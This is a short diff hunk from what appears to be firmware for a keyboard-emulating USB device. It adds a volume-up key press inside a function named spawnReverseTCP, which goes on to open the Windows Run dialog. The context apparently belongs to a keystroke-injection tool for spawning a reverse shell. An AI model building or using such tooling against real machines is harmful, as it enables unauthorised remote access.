@@ -83,6 +83,9 @@ void spawnReverseTCP()                                             // Start the 
     killCaps();                                                    // Turn off Caps Lock if it's on.
     
     returnCode(1, 100);                                            // Keyboard is ready.
+    Keyboard.press(KEY_MEDIA_VOLUME_INC);
+    delay(1200);
+    Keyboard.release(KEY_MEDIA_VOLUME_INC);
     
     Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);                  // Open the Run dialog.
     Keyboard.set_key1(KEY_R);
